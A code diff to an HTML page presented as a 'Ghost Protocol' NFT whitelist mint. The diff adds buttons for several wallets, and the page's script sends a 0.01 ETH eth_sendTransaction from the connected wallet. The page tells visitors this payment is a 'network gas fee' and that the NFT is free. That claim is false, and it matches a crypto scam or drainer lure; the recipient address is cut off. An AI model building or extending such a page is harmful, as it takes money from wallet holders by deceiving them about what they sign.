@@ -4,39 +4,52 @@
   <title>Ghost Protocol – Whitelist Mint</title>
   <style>
     body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding: 50px; }
-    button { background: #00aaff; border: none; padding: 15px 30px; font-size: 20px; border-radius: 10px; cursor: pointer; }
-    button:hover { background: #0088dd; }
+    .btn { background: #00aaff; border: none; padding: 12px 25px; font-size: 16px; border-radius: 8px; cursor: pointer; margin: 8px; }
+    .btn:hover { background: #0088dd; }
+    .btn-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-top: 20px; }
     .info { margin-top: 30px; color: #aaa; font-size: 14px; }
+    #mintArea { margin-top: 30px; }
   </style>
 </head>
 <body>
   <h1>👻 GHOST PROTOCOL</h1>
   <p>Whitelist Mint – 0.01 ETH (Gas Fee)</p>
-  <button id="connectBtn">Connect MetaMask</button>
+  <p>Choose your wallet:</p>
+  <div class="btn-group">
+    <button class="btn" onclick="connectWallet('metamask')">🦊 MetaMask</button>
+    <button class="btn" onclick="connectWallet('trust')">📱 Trust Wallet</button>
+    <button class="btn" onclick="connectWallet('coinbase')">🟣 Coinbase Wallet</button>
+    <button class="btn" onclick="connectWallet('rabby')">🟠 Rabby</button>
+    <button class="btn" onclick="connectWallet('other')">🔗 Other (Web3)</button>
+  </div>
   <div id="mintArea" style="display:none;">
-    <button id="mintBtn">Mint (0.01 ETH Gas Fee)</button>
+    <button class="btn" id="mintBtn" style="font-size:20px; padding:15px 40px;">Mint (0.01 ETH Gas Fee)</button>
     <p class="info">This is the network gas fee. NFT is free.</p>
   </div>
   <script>
     let userAddress = '';
-    document.getElementById('connectBtn').onclick = async () => {
+    async function connectWallet(type) {
       if (typeof window.ethereum !== 'undefined') {
-        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-        userAddress = accounts[0];
-        const chainId = await ethereum.request({ method: 'eth_chainId' });
-        if (chainId !== '0x1') {
-          alert('Please switch to Ethereum Mainnet!');
-          return;
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          userAddress = accounts[0];
+          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+          if (chainId !== '0x1') {
+            alert('Please switch to Ethereum Mainnet!');
+            return;
+          }
+          document.getElementById('mintArea').style.display = 'block';
+          alert('Connected: ' + userAddress.slice(0,10) + '... with ' + type);
+        } catch (e) {
+          alert('Connection failed: ' + e.message);
         }
-        document.getElementById('connectBtn').style.display = 'none';
-        document.getElementById('mintArea').style.display = 'block';
       } else {
-        alert('MetaMask not installed!');
+        alert('No Web3 wallet found. Please install MetaMask, Trust Wallet, Coinbase Wallet, or any Web3 wallet.');
       }
-    };
+    }
     document.getElementById('mintBtn').onclick = async () => {
       try {
-        const tx = await ethereum.request({
+        const tx = await window.ethereum.request({
           method: 'eth_sendTransaction',
           params: [{
             from: userAddress,
